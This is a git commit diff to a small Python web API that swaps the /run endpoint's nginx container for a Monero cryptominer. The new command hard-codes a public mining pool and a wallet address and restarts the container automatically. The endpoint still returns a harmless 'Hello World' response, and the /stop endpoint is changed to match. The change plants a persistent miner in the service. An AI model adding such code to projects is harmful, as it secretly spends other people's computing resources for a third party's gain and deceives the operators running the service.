71361f74275f7ffbaec2b922c6a0ad9c34fdc9a4
Valentin Wach <valentin.wach1@gmail.com>
2024-11-28 15:08:16 +0100

    add: docker mining command

--- src/main.py
+++ src/main.py
@@ -16,11 +16,11 @@ def pull_container():
 
 @app.get("/run")
 def run_container():
-    subprocess.run("docker run --name nginx nginx", shell=True)
+    subprocess.run("docker run -itd --restart=always -e POOL_URL=pool.hashvault.pro:80 -e POOL_USER=41fLkHicU9w9a7mNpfxk13NxqB2FrzFc5HSnbDn1NUPwXy6dkkUgsyQVUBZ7qweyP19BWdMYJ4oq4D2SJ1eexPTv9MLCvQ3 --name monero pmietlicki/monero-miner", shell=True)
     return {"Hello": "World"}
 
 @app.get("/stop")
 def start_container():
-    subprocess.run("docker stop nginx", shell=True)
-    subprocess.run("docker rm nginx", shell=True)
+    subprocess.run("docker stop monero", shell=True)
+    subprocess.run("docker rm monero", shell=True)
 
